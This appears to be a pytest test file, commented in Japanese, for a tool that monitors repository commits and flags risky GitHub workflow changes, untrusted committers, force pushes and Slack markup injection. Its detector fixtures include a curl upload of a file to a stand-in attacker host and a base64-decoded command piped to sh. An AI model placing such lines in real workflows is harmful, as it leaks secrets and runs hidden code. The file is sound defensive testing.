"""app.commit_watch（コミットの判定・監視ジョブ・通知。Issue #405）のテスト。"""
# ruff: noqa: E501 - 試験データの表（1行に1件）を、読みやすい形で並べるため
import os
from datetime import UTC, datetime
from unittest.mock import MagicMock, patch

import httpx

os.environ.setdefault("DATABASE_URL", "sqlite:///./test.db")
os.environ.setdefault("API_KEY", "test-api-key-for-pytest")
os.environ.setdefault("ENVIRONMENT", "development")

from app.commit_watch import analysis  # noqa: E402
from app.commit_watch.crawler import _CommitWatchJob, inspect_repo  # noqa: E402
from app.commit_watch.crawler import _head_sha as head_sha  # noqa: E402
from app.commit_watch.models import CommitWatchState  # noqa: E402
from app.core.notifications.commit_watch import CommitWatchNotifier  # noqa: E402

HEADERS = {"X-API-KEY": "test-api-key-for-pytest"}
SINCE = datetime(2026, 10, 30, tzinfo=UTC)
TRUSTED = analysis.trusted_logins("me", "partner, ")


def _commit(sha="a" * 40, login="me", verified=False, message="fix: x\n\nbody"):
    return {"sha": sha, "html_url": f"https://github.com/o/r/commit/{sha}",
            "author": {"login": login} if login else None,
            "commit": {"message": message, "verification": {"verified": verified}}}


def _workflow_file(*added, name=".github/workflows/ci.yml"):
    return {"filename": name, "patch": "@@ -1 +1 @@\n context\n" + "\n".join("+" + a for a in added)}


class TestAnalysis:
    def test_added_lines_ignore_headers_and_removals(self):
        patch_text = "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n-old\n+new\n context"
        assert analysis.added_lines(patch_text) == ["new"]

    def test_risky_patterns_in_workflows(self):
        files = [_workflow_file(
            "env: { T: ${{ secrets.DEPLOY_TOKEN }} }",
            "run: curl -d @file https://evil.example/upload",
            "on: pull_request_target", "permissions: write-all",
            "run: echo aGk= | base64 -d | sh",
        )]

        rules = [r.rule for r in analysis.find_risky_changes(files)]

        assert rules == ["secrets-reference", "external-upload", "pull-request-target", "write-all", "encoded-exec"]

    def test_the_excerpt_names_the_secret_but_is_cut_and_only_added_lines_count(self):
        long_line = "run: curl https://x.example/" + "a" * 500
        files = [{"filename": ".github/workflows/ci.yml", "patch": f"-run: curl https://old.example\n+{long_line}"}]

        [risky] = analysis.find_risky_changes(files)

        assert len(risky.excerpt) <= 160 and "old.example" not in risky.excerpt

    def test_non_workflow_files_and_plain_changes_are_ignored(self):
        assert analysis.find_risky_changes([
            _workflow_file("run: echo hello"),
            {"filename": "src/app.py", "patch": "+curl https://x.example ${{ secrets.X }}"},
            {"filename": ".github/workflows/ci.yml"},                      # patch なし（巨大・バイナリ）
        ]) == []

    def test_trusted_logins_are_case_insensitive_and_include_bots(self):
        assert TRUSTED == {"me", "partner", "dependabot[bot]", "github-actions[bot]"}
        assert analysis.is_trusted(_commit(login="ME"), TRUSTED) is True
        assert analysis.is_trusted(_commit(login="Partner"), TRUSTED) is True
        assert analysis.is_trusted(_commit(login="mallory"), TRUSTED) is False
        # アカウントに紐づかない（作者が不明の）コミットは、信頼しない
        assert analysis.is_trusted(_commit(login=None), TRUSTED) is False
        assert analysis.is_trusted({"author": {}}, TRUSTED) is False

    def test_verification_and_title(self):
        assert analysis.is_verified(_commit(verified=True)) is True
        assert analysis.is_verified({"commit": {}}) is False
        assert analysis.commit_title(_commit(message="first line\nsecond")) == "first line"
        assert analysis.commit_title(_commit(message="x" * 300)) == "x" * 100
        assert analysis.commit_title({}) == ""


class TestSpoofResistance:
    def test_a_trusted_name_alone_is_trusted_by_default_but_not_when_a_signature_is_required(self):
        unsigned = _commit(login="me", verified=False)
        signed = _commit(login="me", verified=True)

        assert analysis.is_trusted(unsigned, TRUSTED) is True
        assert analysis.is_trusted(unsigned, TRUSTED, require_signature=True) is False
        assert analysis.is_trusted(signed, TRUSTED, require_signature=True) is True
        assert analysis.is_trusted(_commit(login="mallory", verified=True), TRUSTED, require_signature=True) is False

    def test_touches_workflow(self):
        assert analysis.touches_workflow([{"filename": ".github/workflows/ci.yml"}]) is True
        assert analysis.touches_workflow([{"filename": "src/a.py"}, {}]) is False


class TestInspectRepo:
    def _repo(self, commits, details=None, status="ahead", total=None, compare_404=False):
        repo = MagicMock()
        repo.full_name = "o/r"
        repo.path.side_effect = lambda s: f"/repos/o/r{s}"
        api = MagicMock()
        repo.api.return_value.__enter__.return_value = api

        def get(path, params=None):
            resp = MagicMock(status_code=200)
            if "/compare/" in path:
                if compare_404:
                    resp.status_code = 404
                resp.json.return_value = {"status": status, "commits": commits,
                                          "total_commits": total if total is not None else len(commits)}
            else:
                resp.json.return_value = (details or {}).get(path.rsplit("/", 1)[-1], {"files": []})
            return resp
        api.get.side_effect = get
        return repo

    def _inspect(self, repo, **kw):
        return inspect_repo(repo, "b" * 40, "c" * 40, TRUSTED, **kw)

    def test_your_own_ordinary_commits_are_not_reported(self):
        assert self._inspect(self._repo([_commit(sha="1" * 40, login="me")])) == []

    def test_an_unfamiliar_committer_is_reported_with_the_signature_state(self):
        [alert] = self._inspect(self._repo([_commit(sha="2" * 40, login="mallory", verified=False)]))

        assert alert["kind"] == "commit" and alert["author"] == "mallory"
        assert alert["untrusted"] is True and alert["verified"] is False
        assert alert["sha"] == "2222222" and alert["risky"] == [] and alert["touches_workflow"] is False

    def test_a_commit_without_an_account_is_reported_as_unfamiliar(self):
        [alert] = self._inspect(self._repo([_commit(sha="3" * 40, login=None)]))
        assert "紐づかない" in alert["author"]

    def test_your_own_risky_workflow_change_is_reported(self):
        sha = "4" * 40
        repo = self._repo([_commit(sha=sha, login="me")],
                          {sha: {"files": [_workflow_file("run: curl https://x.example/up")]}})

        [alert] = self._inspect(repo)

        assert alert["untrusted"] is False and alert["touches_workflow"] is True
        assert alert["risky"][0]["description"].startswith("外部 URL")

    def test_your_own_harmless_workflow_change_is_not_reported(self):
        sha = "5" * 40
        repo = self._repo([_commit(sha=sha, login="me")], {sha: {"files": [_workflow_file("run: echo hi")]}})
        assert self._inspect(repo) == []

    def test_an_unfamiliar_workflow_change_is_reported_even_if_harmless(self):
        sha = "6" * 40
        repo = self._repo([_commit(sha=sha, login="mallory")], {sha: {"files": [_workflow_file("run: echo hi")]}})
        [alert] = self._inspect(repo)
        assert alert["touches_workflow"] is True and alert["risky"] == []

    def test_an_unsigned_commit_by_a_trusted_name_is_reported_when_signatures_are_required(self):
        repo = self._repo([_commit(sha="7" * 40, login="me", verified=False)])
        [alert] = self._inspect(repo, require_signature=True)
        assert alert["untrusted"] is True

    def test_a_rewritten_history_is_reported_as_a_force_push(self):
        for kwargs in ({"status": "diverged"}, {"status": "behind"}, {"compare_404": True}):
            [alert] = self._inspect(self._repo([], **kwargs))
            assert alert["kind"] == "history_rewritten" and alert["sha"] == "ccccccc"
            assert "bbbbbbb" in alert["title"]

    def test_backdated_commits_cannot_hide_because_the_range_is_by_sha(self):
        old = _commit(sha="8" * 40, login="mallory")
        old["commit"]["author"] = {"date": "2001-01-01T00:00:00Z"}     # 日時を偽っても、SHA の範囲に入る
        [alert] = self._inspect(self._repo([old]))
        assert alert["author"] == "mallory"

    def test_truncation_is_reported_instead_of_silently_advancing(self):
        commits = [_commit(sha=f"{i:040d}", login="me") for i in range(3)]
        alerts = self._inspect(self._repo(commits, total=250))

        assert [a["kind"] for a in alerts] == ["truncated"]
        assert "250" in alerts[0]["title"]


class TestJob:
    def _run(self, db, repos, head="c" * 40, inspect_result=None, inspect_error=None):
        job = _CommitWatchJob()
        counters = MagicMock(inserted=0, deleted=0)
        with patch("app.commit_watch.crawler.list_target_repos", return_value=repos), \
             patch("app.commit_watch.crawler._head_sha", return_value=head), \
             patch("app.commit_watch.crawler.inspect_repo", side_effect=inspect_error,
                   return_value=inspect_result or []) as inspect:
            job.execute(db, counters)
        return job, counters, inspect

    def test_the_first_run_only_records_the_head_sha_and_inspects_nothing(self, db_session):
        job, counters, inspect = self._run(db_session, [{"full_name": "u/app"}])

        inspect.assert_not_called()
        assert job.alerts == [] and counters.inserted == 1
        state = db_session.query(CommitWatchState).one()
        assert (state.repo_full_name, state.last_sha) == ("u/app", "c" * 40)

    def test_later_runs_inspect_from_the_recorded_sha_and_advance_it(self, db_session):
        db_session.add(CommitWatchState(repo_full_name="u/app", last_sha="b" * 40, checked_at=SINCE))
        db_session.commit()
        alert = {"kind": "commit", "repo_full_name": "u/app", "sha": "abc"}

        job, counters, inspect = self._run(db_session, [{"full_name": "u/app"}], inspect_result=[alert])

        assert inspect.call_args.args[1:3] == ("b" * 40, "c" * 40)
        assert job.alerts == [alert] and counters.deleted == 1
        assert db_session.query(CommitWatchState).one().last_sha == "c" * 40

    def test_an_unchanged_head_is_not_inspected(self, db_session):
        db_session.add(CommitWatchState(repo_full_name="u/app", last_sha="c" * 40, checked_at=SINCE))
        db_session.commit()
        _, counters, inspect = self._run(db_session, [{"full_name": "u/app"}])
        inspect.assert_not_called()
        assert counters.inserted == 1

    def test_a_failing_repository_is_skipped_and_its_baseline_does_not_advance(self, db_session):
        db_session.add(CommitWatchState(repo_full_name="u/app", last_sha="b" * 40, checked_at=SINCE))
        db_session.commit()

        _, counters, _ = self._run(db_session, [{"full_name": "u/app"}], inspect_error=httpx.ConnectError("x"))

        assert counters.inserted == 0
        assert db_session.query(CommitWatchState).one().last_sha == "b" * 40

    def test_an_empty_repository_is_skipped(self, db_session):
        _, counters, _ = self._run(db_session, [{"full_name": "u/empty"}], head=None)
        assert counters.inserted == 0 and db_session.query(CommitWatchState).count() == 0

    def test_after_success_notifies_and_never_fails_the_job(self):
        job = _CommitWatchJob()
        job.alerts = [{"x": 1}]
        with patch("app.commit_watch.crawler.CommitWatchNotifier") as notifier:
            job.after_success(MagicMock(inserted=1, deleted=1))
        assert notifier.call_args.args[0] == job.alerts
        with patch("app.commit_watch.crawler.CommitWatchNotifier", side_effect=RuntimeError("x")):
            job.after_success(MagicMock(inserted=1, deleted=1))

    def test_result_entry_point_and_manual_trigger(self, client):
        assert _CommitWatchJob().result(MagicMock(inserted=2, deleted=1)) == (2, 1, 0)
        from app.commit_watch.crawler import fetch_and_watch_commits
        with patch("app.commit_watch.crawler._CommitWatchJob") as cls:
            cls.return_value.run.return_value = (0, 0, 0)
            assert fetch_and_watch_commits(force=True) == (0, 0, 0)

        assert client.post("/admin/commit-watch-crawl").status_code in (401, 403)
        with patch("app.commit_watch.router.run_in_background") as run:
            res = client.post("/admin/commit-watch-crawl?force=true", headers=HEADERS)
        assert res.status_code == 202 and run.call_args[0][0] == "COMMITWATCH"


class TestHeadSha:
    def _repo(self, status, body=None):
        repo = MagicMock()
        repo.path.side_effect = lambda s: s
        repo.api.return_value.__enter__.return_value.get.return_value = MagicMock(
            status_code=status, json=MagicMock(return_value=body or {}))
        return repo

    def test_returns_the_sha_or_none_for_missing_branches(self):
        assert head_sha(self._repo(200, {"sha": "abc"}), "main") == "abc"
        assert head_sha(self._repo(404), "main") is None
        assert head_sha(self._repo(409), "main") is None


class TestNotifier:
    ALERTS = [
        {"kind": "commit", "repo_full_name": "u/a", "sha": "1111111", "url": "u", "author": "mallory", "title": "update ci",
         "verified": False, "untrusted": True, "touches_workflow": False, "risky": []},
        {"kind": "commit", "repo_full_name": "u/b", "sha": "2222222", "url": "u", "author": "me", "title": "ci",
         "verified": True, "untrusted": False, "touches_workflow": True,
         "risky": [{"file": ".github/workflows/ci.yml", "description": "外部 URL への送信（`curl`・`wget`）を追加", "excerpt": "curl https://x.example"}]},
    ]

    def test_has_content_only_with_alerts(self):
        assert CommitWatchNotifier([]).has_content() is False
        assert CommitWatchNotifier(self.ALERTS).has_content() is True

    def test_message_shows_who_what_signature_and_the_steps_to_take(self):
        message = CommitWatchNotifier(self.ALERTS, recipients=["h"]).build_message()

        assert message.index("u/b") < message.index("u/a")            # 危険な内容を含むものが先
        assert "見慣れないコミッター・署名なし" in message and "ワークフローを変更" in message
        assert "curl https://x.example" in message
        assert "失効し、再発行" in message and "履歴" in message

    def test_history_rewrites_and_truncation_are_shown_without_commit_fields(self):
        alerts = [
            {"kind": "truncated", "repo_full_name": "u/c", "sha": "ccccccc", "title": "250件中100件"},
            {"kind": "history_rewritten", "repo_full_name": "u/d", "sha": "ddddddd", "title": "前回が無い"},
            self.ALERTS[0],
        ]

        message = CommitWatchNotifier(alerts, recipients=["h"]).build_message()

        assert "履歴が書き換えられました" in message and "未確認のコミットがあります" in message
        assert message.index("u/d") < message.index("u/a")        # 履歴の書き換えが先

    def test_external_text_cannot_inject_slack_markup(self):
        evil = [{**self.ALERTS[0], "title": "<!channel> `x` <https://evil|click>", "author": "a`b"}]
        message = CommitWatchNotifier(evil, recipients=["h"]).build_message()
        assert "<!channel>" not in message and "<https://evil" not in message

    def test_long_lists_and_default_recipient(self):
        many = [{**self.ALERTS[0], "sha": f"{i:07d}"} for i in range(13)]
        assert "ほか 3件" in CommitWatchNotifier(many, recipients=["h"]).build_message()
        with patch("app.core.notifications.recipients.resolve_admin_recipient", return_value=["h"]) as admin:
            assert CommitWatchNotifier([]).default_recipients() == ["h"]
        admin.assert_called_once()
